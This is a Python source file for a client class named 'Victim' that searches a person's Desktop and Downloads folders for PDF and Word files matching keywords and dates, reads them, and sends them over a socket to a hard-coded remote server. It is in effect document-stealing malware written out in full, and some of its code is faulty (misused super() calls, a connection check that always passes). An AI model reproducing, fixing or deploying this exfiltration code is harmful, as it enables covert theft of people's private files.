__author__ = 'ben'

import os
import socket

from real.DocPullerScripts.DocPullerFTP.protocol import Protocol
from real.DocPullerScripts.DocPullerGenric import DocPuller


class Victim(DocPuller, Protocol):

    def __init__(self, server, port, directorys, file_types, key_words, date):
        super(DocPuller).__init__(directorys, file_types, key_words, date)
        super(Protocol).__init__(server, port)
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def _pull_files(self):
        while self._running or not self._pull_files_queue.empty():
            if not self._pull_files_queue.empty():
                file_name = self._pull_files_queue.get().split('\\')[-1]
                with open(file_name, 'rb') as f:
                    file_data = f.read()
                file_name = file_name.encode()
                self.send_file(self.victim, file_name, file_data)

    def main(self):
        try:
            self.victim.connect(self.ADDR)
        except Exception as e:
            print(e)

        connected = True
        if connected:
            self._main()
        self.victim.close()
        print('done.')


if __name__ == '__main__':
    Victim('192.168.1.133', 8830,
           ('Desktop', 'Downloads'), ('.pdf', '.doc'), ('test', 'math'), {'2023': ('06', '05',)}
           ).main()
